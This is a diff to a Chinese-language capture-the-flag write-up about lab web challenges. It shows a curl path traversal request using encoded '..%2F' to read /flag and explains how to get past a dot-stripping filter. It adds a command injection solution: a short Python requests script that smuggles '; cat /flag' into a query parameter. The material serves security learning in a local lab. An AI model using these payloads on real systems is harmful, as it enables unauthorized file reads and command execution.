@@ -315,3 +315,16 @@ curl -v http://challenge.localhost:80/data/fortunes/..%2F..%2F..%2Fflag
 从level2的server源码`requested_path = app.root_path + "/files/" + path.strip("/.")`可以观察到，相较于level1，level2将path首尾的 `.` 和 `\` 字符删去了，我们只需要在路径首部加上一个存在的文件夹即可绕过。根据观察，在/challenge/files路径下存在一个fortunes文件夹，我们可以借此绕过检查。
 
 ### CMDi 1-6
+CMDi 1
+
+利用server代码执行命令，简单用`;`分隔不同的命令。
+
+```python
+import requests
+
+arg="; cat /flag"
+
+response = requests.get(f"http://challenge.localhost:80/puzzle?topdir={arg}")
+print(response.request)
+print(response.content)
+```
